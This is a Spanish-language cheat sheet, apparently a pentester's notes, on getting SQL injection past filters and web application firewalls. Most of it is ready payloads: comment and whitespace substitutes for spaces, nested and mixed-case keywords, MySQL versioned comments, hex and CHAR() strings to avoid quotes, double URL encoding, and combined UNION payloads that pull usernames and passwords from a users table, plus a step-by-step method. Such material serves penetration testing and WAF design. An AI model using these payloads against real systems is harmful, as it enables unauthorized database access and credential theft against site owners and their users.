# SQL Injection - Ofuscación y bypass de filtros / WAF

Notas para cuando un filtro o WAF bloquea keywords (`UNION`, `SELECT`, `OR`),
espacios, comillas o comentarios en una inyección SQL. Idea: expresar la misma
consulta con una **representación que el motor SQL entiende pero el filtro no**.

> Ajusta la sintaxis al motor: MySQL, PostgreSQL, MSSQL y Oracle difieren.

---

## 1. Bypass de ESPACIOS filtrados

Cuando el filtro elimina o bloquea espacios, sustitúyelos:

| Reemplazo | Ejemplo | Motor |
|-----------|---------|-------|
| Comentario `/**/` | `UNION/**/SELECT` | todos |
| Paréntesis | `UNION(SELECT(1),(2))` | todos |
| Whitespace alternativo | `%09 %0a %0b %0c %0d %a0` (tab, newline, etc.) | varía |
| MySQL comment inline | `/*!50000UNION*/` | MySQL |
| Newline | `UNION%0aSELECT` | todos |

```sql
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users-- -
'%0aUNION%0aSELECT%0a1,2-- -
'UNION(SELECT(username),(password))FROM(users)-- -
```

---

## 2. Bypass de KEYWORDS bloqueadas

### 2.1 Cambio de mayúsculas/minúsculas
Muchos filtros mal hechos son case-sensitive:
```sql
UnIoN SeLeCt
```

### 2.2 Doble keyword (filtro que borra UNA vez)
Si el filtro elimina `UNION` una sola vez, anídalo:
```sql
UNIUNIONON SELSELECTECT
```
Al quitar el `UNION`/`SELECT` interno queda el válido.

### 2.3 Comentarios inline de MySQL
```sql
/*!UNION*/ /*!SELECT*/ 1,2
/*!50000UNION*/ /*!50000SELECT*/ 1,2   // solo si versión >= 5.00.00
```

### 2.4 Palabras equivalentes / operadores
```sql
OR  ->  ||         (MySQL/Oracle)
AND ->  &&          (MySQL)
=   ->  LIKE  /  <=>  /  IN(...)
,   ->  JOIN  (para evitar la coma en UNION SELECT)
```
Bypass de coma en `LIMIT`/`SELECT`:
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
LIMIT 1 OFFSET 1        -- en vez de LIMIT 1,1
```

---

## 3. Bypass de COMILLAS filtradas

Construir strings sin `'` `"`:

### 3.1 Valor hexadecimal
```sql
-- MySQL: 'admin' = 0x61646d696e
SELECT * FROM users WHERE username=0x61646d696e
```

### 3.2 `CHAR()` / `CHR()`
```sql
-- MySQL
CHAR(97,100,109,105,110)          -- 'admin'
-- PostgreSQL / Oracle
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
-- MSSQL
CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
```

### 3.3 Concatenación
```sql
-- MySQL:  CONCAT()  o  'ad' 'min' (strings adyacentes)
-- MSSQL:  'ad'+'min'
-- Oracle/Postgres:  'ad'||'min'
```

---

## 4. Bypass de COMENTARIOS finales

Formas de comentar el resto de la query:
```sql
-- -           (guion-guion-espacio; el "-" extra evita problemas)
#              (MySQL)
/*             (comentario multilinea sin cerrar; MySQL/MSSQL)
;%00           (null byte, en algunos casos)
```

---

## 5. Encoding para atravesar el filtro

El WAF ve una cosa; el servidor/motor decodifica a otra.

| Técnica | Ejemplo |
|---------|---------|
| URL encoding | `%27` = `'` , `%20` = espacio |
| Doble URL encoding | `%2527` -> `%27` -> `'` |
| Unicode (MySQL/algún WAF) | `%u0027` |
| Hex en la query | `0x...` |
| Comentarios versionados MySQL | `/*!...*/` |

Doble URL encoding es clásico contra WAFs que decodifican una vez y el backend
decodifica otra:
```
?id=1%2527%2520UNION%2520SELECT...
```

---

## 6. Payloads de ejemplo (combinando técnicas)

```sql
-- Union sin espacios ni comillas, MySQL:
'/**/UNION/**/SELECT/**/CHAR(97,100,109,105,110),0x70617373/**/FROM/**/users-- -

-- OR con operadores y comentarios:
'||1=1#

-- Doble keyword + case + inline comment:
'/*!50000uNiOn*/(/*!50000sElEcT*/username,password/**/from/**/users)-- -

-- Blind boolean sin '=' :
' AND username LIKE CHAR(97,37)-- -    -- ¿empieza por 'a'?
```

---

## 7. Metodología

1. **Detecta qué se filtra**: manda cada carácter/keyword suelto y observa la
   respuesta (error, 403 del WAF, o reflejo limpio).
2. **Empieza por lo mínimo**: primero salta espacios, luego keywords, luego comillas.
3. **Confirma con boolean/time-based** antes de montar el UNION completo.
4. **Ajusta al motor** (funciones de string y concatenación cambian).
